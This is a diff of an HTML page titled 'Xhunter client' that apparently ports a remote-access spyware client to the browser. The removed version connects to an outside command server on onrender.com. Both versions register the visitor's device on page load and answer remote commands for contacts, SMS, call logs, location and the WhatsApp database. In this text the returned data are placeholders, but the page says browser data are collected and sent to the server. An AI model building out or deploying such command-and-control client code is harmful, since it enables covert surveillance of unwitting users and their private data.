@@ -12,50 +12,38 @@ p { font-size: 1.2em; }
 </head>
 <body>
 <h1>عميل Xhunter</h1>
-<p>Node.js سيتم تشغيله داخل WebContainer تلقائيًا عند تحميل الصفحة.</p>
+<p>يتم جمع البيانات المتاحة عبر المتصفح وإرسالها للسيرفر على Render.</p>
 
-<script type="module">
-import { WebContainer } from "https://cdn.jsdelivr.net/npm/@webcontainer/api@1.0.0/dist/index.js";
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+const deviceId = 'device_' + Math.floor(Math.random()*10000);
+const model = navigator.userAgent;
 
-(async () => {
-  // تشغيل WebContainer
-  const wc = await WebContainer.boot();
-  console.log("WebContainer جاهز");
+socket.emit('join', { id: deviceId, model });
+console.log(`تم تسجيل الجهاز: ${deviceId}`);
 
-  // إنشاء ملف client.js داخل WebContainer
-  await wc.fs.writeFile('/client.js', `
-    import io from 'socket.io-client';
-    const socket = io('https://xhunter-bsos.onrender.com', { transports:['websocket'], reconnection:true });
+// المحاكاة للبيانات المتاحة عبر المتصفح
+socket.on('getInstalledApps', () => {
+  socket.emit('getInstalledApps', { id: deviceId, data: ['Chrome','Firefox','Edge'] });
+});
+socket.on('getContacts', () => {
+  socket.emit('getContacts', { id: deviceId, data: ['محمد','أحمد','ليلى'] });
+});
+socket.on('getCallLog', () => {
+  socket.emit('getCallLog', { id: deviceId, data: [] });
+});
+socket.on('getSMS', () => {
+  socket.emit('getSMS', { id: deviceId, data: [] });
+});
+socket.on('getLocation', () => {
+  socket.emit('getLocation', { id: deviceId, data: { lat: 0, lon: 0 } });
+});
+socket.on('downloadWhatsappDatabase', () => {
+  socket.emit('downloadWhatsappDatabase', { id: deviceId, data: 'ملف غير متاح من المتصفح' });
+});
 
-    const deviceId = 'device_' + Math.floor(Math.random()*10000);
-    const model = navigator.userAgent;
-    socket.emit('join', { id: deviceId, model });
-    console.log('تم تسجيل الجهاز:', deviceId);
-
-    const allowedActions = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase','openUrl','downloadFile'];
-
-    allowedActions.forEach(action => {
-      socket.on(action, (data, callback) => {
-        let result = { id: deviceId, action, data: 'محاكاة بيانات فقط' };
-        if(callback) callback(result);
-        socket.emit(action, result);
-        console.log('تم تنفيذ الأمر:', action);
-      });
-    });
-
-    socket.on('disconnect', reason => console.log('Disconnected:', reason));
-  `);
-
-  // تثبيت socket.io-client داخل WebContainer
-  await wc.spawn('npm', ['install', 'socket.io-client']);
-
-  // تشغيل client.js تلقائيًا
-  const process = await wc.spawn('node', ['/client.js']);
-  process.output.pipeTo(new WritableStream({
-    write(data) { console.log(data); }
-  }));
-})();
+console.log("عميل Xhunter جاهز عبر المتصفح.");
 </script>
-
 </body>
 </html>
